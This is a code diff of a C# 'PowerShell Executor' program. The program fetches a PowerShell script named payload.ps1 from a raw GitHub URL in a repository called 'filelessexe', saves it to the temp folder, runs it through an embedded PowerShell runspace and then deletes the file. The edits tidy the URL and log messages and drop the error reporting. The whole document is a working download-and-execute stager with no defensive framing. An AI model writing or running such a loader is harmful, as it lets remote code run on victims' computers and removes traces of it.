@@ -11,16 +11,14 @@ class Program
         Console.Title = "PowerShell Executor";
         Console.WriteLine("[INFO] Starting PowerShell script execution...");
 
-        string payloadUrl = "https://raw.githubusercontent.com/N4V33NM/filelessexe/refs/heads/main/payload.ps1";
-        Console.WriteLine($"[INFO] Using payload URL: {payloadUrl}");
+        string payloadUrl = "https://raw.githubusercontent.com/N4V33NM/filelessexe/main/payload.ps1";
+        Console.WriteLine($"[INFO] Fetching script from: {payloadUrl}");
 
-        string tempFilePath = Path.Combine(Path.GetTempPath(), "temp_payload.ps1");
-        
-        string payloadContent = await FetchPayload(payloadUrl, tempFilePath);
+        string tempPath = Path.Combine(Path.GetTempPath(), "payload.ps1");
 
-        if (!string.IsNullOrEmpty(payloadContent))
+        if (await FetchPayload(payloadUrl, tempPath))
         {
-            ExecutePayload(tempFilePath);
+            ExecutePayload(tempPath);
         }
         else
         {
@@ -31,27 +29,22 @@ class Program
         Console.ReadLine();
     }
 
-    static async Task<string> FetchPayload(string url, string tempFilePath)
+    static async Task<bool> FetchPayload(string url, string tempPath)
     {
         try
         {
-            Console.WriteLine($"[INFO] Fetching payload from: {url}");
             using (HttpClient client = new HttpClient())
             {
-                client.Timeout = TimeSpan.FromSeconds(10);
                 string content = await client.GetStringAsync(url);
-                
-                // Write to a temp file
-                await File.WriteAllTextAsync(tempFilePath, content);
-                Console.WriteLine($"[SUCCESS] Payload written to: {tempFilePath}");
-                
-                return content;
+                await File.WriteAllTextAsync(tempPath, content);
+                Console.WriteLine($"[SUCCESS] Payload saved at: {tempPath}");
+                return true;
             }
         }
         catch (Exception ex)
         {
             Console.WriteLine($"[ERROR] Failed to fetch payload: {ex.Message}");
-            return string.Empty;
+            return false;
         }
     }
 
@@ -59,7 +52,7 @@ class Program
     {
         try
         {
-            Console.WriteLine("[INFO] Executing payload in-memory...");
+            Console.WriteLine("[INFO] Executing PowerShell script...");
             using (PowerShell ps = PowerShell.Create())
             {
                 string scriptContent = File.ReadAllText(filePath);
@@ -71,29 +64,18 @@ class Program
                 {
                     Console.WriteLine(result);
                 }
-
-                if (ps.HadErrors)
-                {
-                    Console.WriteLine("[ERROR] PowerShell encountered errors:");
-                    foreach (var error in ps.Streams.Error)
-                    {
-                        Console.WriteLine(error.ToString());
-                    }
-                }
             }
 
-            Console.WriteLine("[SUCCESS] Payload executed!");
-
-            // Delete the temporary file after execution
             File.Delete(filePath);
             Console.WriteLine("[INFO] Temp file deleted.");
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"[ERROR] Failed to execute payload: {ex.Message}");
+            Console.WriteLine($"[ERROR] Execution failed: {ex.Message}");
         }
     }
 }
+
 
 
 
